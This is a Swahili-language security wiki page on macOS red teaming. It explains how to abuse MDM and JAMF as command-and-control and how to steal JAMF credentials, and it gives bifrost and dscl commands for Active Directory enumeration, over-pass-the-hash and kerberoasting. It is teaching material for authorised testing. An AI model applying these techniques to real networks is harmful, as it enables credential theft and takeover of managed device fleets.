# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Kutumia vibaya MDMs

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Ukifanikiwa **kuiba credentials za admin** ili kufikia jukwaa la usimamizi, unaweza **kuhatarisha kompyuta zote** kwa kusambaza malware kwenye mashine hizo.

Kwa red teaming katika mazingira ya MacOS, inapendekezwa sana kuelewa jinsi MDMs zinavyofanya kazi:


{{#ref}}
macos-mdm/
{{#endref}}

### Kutumia MDM kama C2

MDM itakuwa na ruhusa ya kusakinisha, kuuliza taarifa kuhusu au kuondoa profiles, kusakinisha applications, kuunda akaunti za local admin, kuweka firmware password, kubadilisha FileVault key...

Ili kuendesha MDM yako mwenyewe, unahitaji **CSR yako isainiwe na vendor**; unaweza kujaribu kufanya hivyo kupitia [**https://mdmcert.download/**](https://mdmcert.download/). Ili kuendesha MDM yako mwenyewe kwa vifaa vya Apple, unaweza kutumia [**MicroMDM**](https://github.com/micromdm/micromdm).

Kusajili kifaa kwenye MDM **hakufanyi** certificate ya TLS ya server ya usimamizi kuwa CA inayoaminika moja kwa moja, wala hakupi identity ya kusaini apps. Ikiwa server inatumia CA ya faragha, root na intermediate certificates zake lazima zijumuishwe kwenye enrollment profile au trust profile tofauti. Client identity inayotumika kwa uthibitishaji wa MDM ni certificate tofauti.<sup>[[7]](#references)</sup>

Enrollment profile ya MDM iliyopakuliwa (`.mobileconfig`) lazima ifunguliwe na kuidhinishwa kwenye **System Settings → General → Device Management**. Kuiweka tu ndani ya `.pkg` iliyosakinishwa na root au ZIP iliyofunguliwa kwa Safari hakuandikishi Mac ya sasa kwenye MDM bila idhini. Tazama [tabia ya configuration profile](../macos-auto-start-locations.md#configuration-profiles-mobileconfig).<sup>[[8]](#references)</sup>

Automated Device Enrollment wakati wa Setup Assistant ni mchakato tofauti. Tazama [kusajili kifaa cha shirika lingine kwa njia isiyoidhinishwa](macos-mdm/enrolling-devices-in-other-organisations.md) kwa masharti yake tofauti ya awali.<sup>[[9]](#references)</sup>

**Mythic agent Orthrus** hutumia mbinu hii.

### Kusambaza package kupitia MDM inayodhibitiwa

Kwenye **Mac inayosimamiwa (supervised) na inayotumia macOS 26 au matoleo mapya zaidi**, udhibiti wa huduma ya MDM huruhusu tamko la `com.apple.configuration.package` katika system scope.<sup>[[10]](#references)</sup> Package lazima iwe na signature ambayo kifaa kinaweza kuthibitisha, lakini app yake haihitaji signature tofauti ya Developer ID: Gatekeeper haikagui apps zinazosakinishwa kupitia usimamizi wa kifaa.<sup>[[11]](#references)</sup> Certificate ya TLS inayoaminika ya server pekee haimpi operator private key au matumizi ya kusaini yanayohitajika kwa signature ya package hiyo.<sup>[[11]](#references)[[12]](#references)</sup>

Jenga test package iliyosainiwa, hesabu digest yake, kisha uchapishe package na plist ya `ManifestURL` kupitia HTTPS. Manifest inahitaji asset moja ya `software-package` yenye URL yake na SHA-256, pamoja na `bundle-identifier` na `bundle-version` za kipekee.<sup>[[11]](#references)</sup> Kisha tuma tamko la package lenye URL hiyo ya manifest na uweke `InstallBehavior.Install` kuwa `Required`; angalia kipengee cha hali cha `package.list` ili kuthibitisha usakinishaji au kuona hitilafu.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
pkgbuild --component ./Test.app --install-location /Applications --sign "Package Signing Certificate" ./Test.pkg
shasum -a 256 ./Test.pkg
```

Tamko la chini kabisa la usakinishaji unaohitajika, linalowasilishwa kupitia huduma ya MDM, linaonekana hivi (badilisha URL na UUID zote mbili).<sup>[[10]](#references)</sup>

```json
{
  "Type": "com.apple.configuration.package",
  "Identifier": "11111111-1111-4111-8111-111111111111",
  "ServerToken": "22222222-2222-4222-8222-222222222222",
  "Payload": {
    "ManifestURL": "https://mdm.example.org/TestPackage.plist",
    "InstallBehavior": {"Install": "Required"}
  }
}
```

### Kutumia vibaya JAMF PRO

JAMF inaweza kuendesha **custom scripts** (script zilizotengenezwa na sysadmin), **native payloads** (kuunda akaunti za ndani, kuweka nenosiri la EFI, kufuatilia faili/mchakato...) na **MDM** (usanidi wa kifaa, vyeti vya kifaa...).<sup>[[5]](#references)</sup>

#### Kujiandikisha mwenyewe kwa JAMF

Nenda kwenye ukurasa kama `https://<company-name>.jamfcloud.com/enroll/` ili kuona kama **kujiandikisha mwenyewe kumewashwa**. Ikiwa kumewashwa, unaweza **kuombwa kitambulisho ili kufikia ukurasa huo**.

Unaweza kutumia script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) kutekeleza shambulio la password spraying.

Zaidi ya hayo, baada ya kupata kitambulisho halali, unaweza kutumia fomu ifuatayo kufanya brute-force ya majina mengine ya watumiaji:

![Kutumia vibaya JAMF PRO - Kujiandikisha mwenyewe kwa JAMF: Zaidi ya hayo, baada ya kupata kitambulisho halali, unaweza kutumia fomu ifuatayo kufanya brute-force ya majina mengine ya watumiaji](<../../images/image (107).png>)

#### Uthibitishaji wa kifaa cha JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Binary ya **`jamf`** ilikuwa na siri ya kufungua keychain ambayo wakati wa ugunduzi ilishirikiwa na kila mtu; siri hiyo ilikuwa: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Zaidi ya hayo, jamf **hudumu** kama **LaunchDaemon** katika **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Kuteka kifaa cha JAMF

**URL** ya **JSS** (Jamf Software Server) ambayo **`jamf`** itatumia iko katika **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Faili hii kimsingi ina URL:

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://subdomain-company.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```

Kwa hiyo, mshambuliaji angeweza kuweka package (`pkg`) hasidi ambayo **huandika juu ya faili hii** inaposakinishwa, na kuweka **URL ya listener ya Mythic C2 kutoka kwa agent ya Typhon** ili aweze kutumia vibaya JAMF kama C2.

```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```

#### JAMF Impersonation

Ili **kuiga mawasiliano** kati ya kifaa na JMF unahitaji:

- **UUID** ya kifaa: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **JAMF keychain** kutoka: `/Library/Application\ Support/Jamf/JAMF.keychain` ambayo ina cheti cha kifaa

Ukitumia maelezo haya, **unda VM** yenye **UUID** ya Hardware **iliyoibwa** na **SIP ikiwa imezimwa**, weka **JAMF keychain**, **hook** Jamf **agent** kisha uibe maelezo yake.

#### Kuiba siri

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Unaweza pia kufuatilia eneo la `/Library/Application Support/Jamf/tmp/` ili kuona **custom scripts** ambazo wasimamizi wanaweza kutaka kutekeleza kupitia Jamf, kwani **huwekwa hapa, hutekelezwa kisha huondolewa**. Huenda scripts hizi **zikawa na credentials**.

Hata hivyo, **credentials** zinaweza kupitishwa kwa scripts hizi kama **parameters**, kwa hivyo utahitaji kufuatilia `ps aux | grep -i jamf` (hata bila kuwa root).

Script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) inaweza kusikiliza faili mpya zinazoongezwa na arguments mpya za process.

### Ufikiaji wa Mbali wa macOS

Na pia kuhusu **protocols** za **network** za "kipekee" za **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Wakati mwingine utakuta kwamba **kompyuta ya MacOS imeunganishwa kwenye AD**. Katika hali hii unapaswa kujaribu **kuhesabu** active directory kama ulivyozoea. Pata **msaada** katika kurasa zifuatazo:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Baadhi ya **zana za ndani za MacOS** ambazo pia zinaweza kukusaidia ni `dscl`:

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

Pia kuna baadhi ya zana zilizotayarishwa kwa MacOS ili kuorodhesha AD kiotomatiki na kutumia kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound ni kiendelezi cha zana ya Bloodhound ya ukaguzi kinachowezesha kukusanya na kuingiza mahusiano ya Active Directory kwenye vifaa vya MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost ni mradi wa Objective-C ulioundwa kuingiliana na API za Heimdal krb5 kwenye macOS. Lengo la mradi huu ni kuwezesha upimaji bora wa usalama wa Kerberos kwenye vifaa vya macOS kwa kutumia API asilia bila kuhitaji framework au vifurushi vingine kwenye kifaa lengwa.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Zana ya JavaScript for Automation (JXA) ya kuorodhesha Active Directory.

### Taarifa za Kikoa

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Watumiaji

Aina tatu za watumiaji wa MacOS ni:

- **Local Users** — Husimamiwa na huduma ya ndani ya OpenDirectory; hawajaunganishwa kwa njia yoyote na Active Directory.
- **Network Users** — Watumiaji wa Active Directory wa muda wanaohitaji kuunganishwa na seva ya DC ili kuthibitisha utambulisho wao.
- **Mobile Users** — Watumiaji wa Active Directory walio na hifadhi rudufu ya ndani ya taarifa zao za kuingia na faili zao.

Taarifa za ndani kuhusu watumiaji na vikundi huhifadhiwa kwenye folda _/var/db/dslocal/nodes/Default._\
Kwa mfano, taarifa kuhusu mtumiaji anayeitwa _mark_ huhifadhiwa kwenye _/var/db/dslocal/nodes/Default/users/mark.plist_ na taarifa kuhusu kikundi _admin_ huhifadhiwa kwenye _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Mbali na kutumia edges za HasSession na AdminTo, **MacHound huongeza edges tatu mpya** kwenye hifadhidata ya Bloodhound:<sup>[[2]](#references)</sup>

- **CanSSH** - huluki iliyoruhusiwa kutumia SSH kuingia kwenye host
- **CanVNC** - huluki iliyoruhusiwa kutumia VNC kuingia kwenye host
- **CanAE** - huluki iliyoruhusiwa kutekeleza script za AppleEvent kwenye host

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

Maelezo zaidi katika [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Nenosiri la Computer$

Pata nywila kwa kutumia:

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

Inawezekana kufikia nenosiri la **`Computer$`** ndani ya keychain ya System.

### Over-Pass-The-Hash

Pata TGT ya mtumiaji na huduma maalum:

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

Baada ya kupata TGT, inawezekana kuiingiza kwenye session ya sasa kwa kutumia:

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

Kwa kutumia service tickets zilizopatikana, inawezekana kujaribu kufikia shares kwenye kompyuta nyingine:

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Kufikia Keychain

Keychain huenda sana ikawa na taarifa nyeti ambazo, zikifikiwa bila kutoa prompt, zinaweza kusaidia kuendeleza zoezi la red team:


{{#ref}}
macos-keychain.md
{{#endref}}

## Huduma za Nje

MacOS Red Teaming ni tofauti na Windows Red Teaming ya kawaida kwa sababu kwa kawaida **MacOS imeunganishwa moja kwa moja na mifumo kadhaa ya nje**. Usanidi wa kawaida wa MacOS ni kufikia kompyuta kwa kutumia **credentials zilizosawazishwa za OneLogin, na kufikia huduma kadhaa za nje** (kama github, aws...) kupitia OneLogin.

## Mbinu Mbalimbali za Red Team

### Safari

Faili inapopakuliwa katika Safari, ikiwa ni faili "salama", **hufunguliwa kiotomatiki**. Kwa mfano, uki **pakua zip**, itafunguliwa kiotomatiki:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>



## References

- [1] [Kuchuma Tufaha: Red Teaming Mazingira ya MacOS mwaka 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Tunakuletea MacHound: Suluhisho la Mashambulizi dhidi ya Active Directory ya macOS](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Amri za Kuhesabu Vikoa (sawa na dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Karibu Upande wa Giza, Tuna Tufaha: Kufanya Usimamizi wa macOS Kuwa Mwovu](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "Mtazamo wa Mshambuliaji kuhusu Usanidi wa Jamf" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Ugunduzi wa Active Directory kwa kutumia Mac - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [7] [Apple — Kusimamia vyeti vya huduma na vifaa vya usimamizi wa kifaa](https://developer.apple.com/documentation/devicemanagement/managing-certificates-for-device-management-services-and-devices)
- [8] [Apple — Kutumia wasifu wa usanidi kwenye Mac](https://support.apple.com/en-gb/guide/mac-help/mh35561/mac)
- [9] [Apple — Kusambaza wasifu wa usajili wa usimamizi wa kifaa](https://developer.apple.com/documentation/devicemanagement/deploying-device-management-enrollment-profiles)
- [10] [Apple — Tamko la kifurushi](https://developer.apple.com/documentation/devicemanagement/package)
- [11] [Apple — Kusakinisha vifurushi](https://developer.apple.com/documentation/devicemanagement/installing-packages)
- [12] [Apple — Utambulisho](https://developer.apple.com/documentation/security/identities)
{{#include ../../banners/hacktricks-training.md}}
